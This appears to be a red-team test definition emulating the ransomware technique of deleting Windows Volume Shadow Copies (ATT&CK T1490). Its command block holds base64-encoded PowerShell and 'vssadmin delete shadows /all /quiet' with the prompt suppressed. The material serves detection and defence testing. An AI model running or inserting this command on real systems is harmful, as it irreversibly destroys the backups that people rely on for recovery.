- id: 3ed6d1e6-d5c0-52bc-8085-960a4b6bfe46
  name: Soumaia ART Tests - Windows - Delete Volume Shadow Copies
  description: 'Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon

    execution, if no shadow volumes exist the message "No items found that satisfy the query." will be displayed. If shadow volumes are present, it

    will delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n

    confirmation prompt. Shadow copies can only be created on Windows server or Windows 8.


    https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11) (requires elevation)'
  tactic: impact
  technique:
    attack_id: T1490
    name: Inhibit System Recovery
  platforms:
    windows:
      cmd:
        command: |-
          powershell -NoProfile -EncodedCommand aQBmACgAIQAoAHYAcwBzAGEAZABtAGkAbgAuAGUAeABlACAAbABpAHMAdAAgAHMAaABhAGQAbwB3AHMAIAB8ACAAZgBpAG4AZABzAHQAcgAgACIATgBvACAAaQB0AGUAbQBzACAAZgBvAHUAbgBkACAAdABoAGEAdAAgAHMAYQB0AGkAcwBmAHkAIAB0AGgAZQAgAHEAdQBlAHIAeQAuACIAKQApACAAewAgAGUAeABpAHQAIAAwACAAfQAgAGUAbABzAGUAIAB7ACAAZQB4AGkAdAAgADEAIAB9AAoA
          if not "%ERRORLEVEL%"=="0" (
              powershell -NoProfile -EncodedCommand dgBzAHMAYQBkAG0AaQBuAC4AZQB4AGUAIABjAHIAZQBhAHQAZQAgAHMAaABhAGQAbwB3ACAALwBmAG8AcgA9AGMAOgAKAA==
          )
          vssadmin.exe delete shadows /all /quiet
